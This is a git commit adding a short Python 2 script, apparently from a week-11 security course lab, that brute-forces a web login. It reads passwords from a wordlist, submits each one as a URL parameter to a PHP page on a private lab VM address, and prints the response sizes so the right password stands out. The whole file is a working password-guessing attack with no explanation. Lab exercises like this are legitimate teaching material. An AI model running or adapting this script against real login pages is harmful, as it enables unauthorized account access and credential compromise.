d2c7452b21cb25fcbfdbf67d90bfb3d20e49bc24
kts262 <kevin.shivers@gmail.com>
2018-04-16 13:34:00 -0400

    Create brute-force.py

---
+++ week11/brute-force.py
@@ -0,0 +1,22 @@
+#!/usr/bin/python
+# Brute Force web URL
+
+import requests
+
+passwords = open('passwords', 'r')
+
+#replace IP with the IP of your Ubuntu VM...
+base_url = "http://192.168.2.159/brute2.php?password="
+end_url = "&Enter=Enter"
+
+for password in passwords:
+  password = password.rstrip()
+  url = base_url + password + end_url
+  try:
+    r = requests.get(url)
+    if r.status_code == 200:
+      result_len = len(r.content)
+      print "Password: " + password  + "\tResponse size = " + str(result_len)	
+
+  except Exception, e:
+    pass
